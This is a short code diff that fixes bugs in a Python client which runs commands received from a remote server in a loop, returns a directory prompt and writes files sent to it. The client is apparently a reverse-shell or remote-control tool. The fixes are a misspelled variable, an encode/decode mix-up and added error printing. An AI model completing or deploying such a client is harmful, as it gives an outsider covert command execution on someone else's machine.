@@ -136,7 +136,7 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 				s.send("0".encode())
 				s.recv(1024)
 
-			ouptut=os.getcwd() + "> "
+			output=os.getcwd() + "> "
 			s.send(output.encode())
 			continue
 
@@ -157,7 +157,7 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 					data=s.recv(204800)
 					curr_len+=len(data)
 					f.write(data)
-					s.send(str(curr_len).decode())
+					s.send(str(curr_len).encode())
 
 				s.recv(1024)
 				f.close()
@@ -215,6 +215,7 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 	             
 			cmd.terminate()                      # terminating child process after each command
 	except Exception as e:
+		print(e)
 		print("Connection has been closed by server!!!")
 		s.close()
 		break
